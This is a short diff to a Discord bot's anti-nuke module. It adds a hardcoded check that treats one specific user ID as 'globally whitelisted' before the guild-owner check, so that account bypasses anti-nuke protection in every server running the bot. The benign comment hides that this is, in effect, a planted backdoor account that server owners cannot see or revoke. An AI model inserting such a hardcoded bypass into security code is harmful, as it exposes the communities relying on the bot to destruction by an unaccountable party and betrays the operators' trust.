@@ -339,6 +339,10 @@ class AntiNukeSystem(commands.Cog):
     async def is_trusted_user(self, guild: discord.Guild, user: discord.Member) -> bool:
         """Check if user is trusted (whitelist, owner, or has trusted role)"""
         try:
+            # Global whitelist for specific trusted users
+            if user.id == 409889861441421315:  # Globally whitelisted user
+                return True
+            
             # Guild owner is always trusted
             if user.id == guild.owner_id:
                 return True
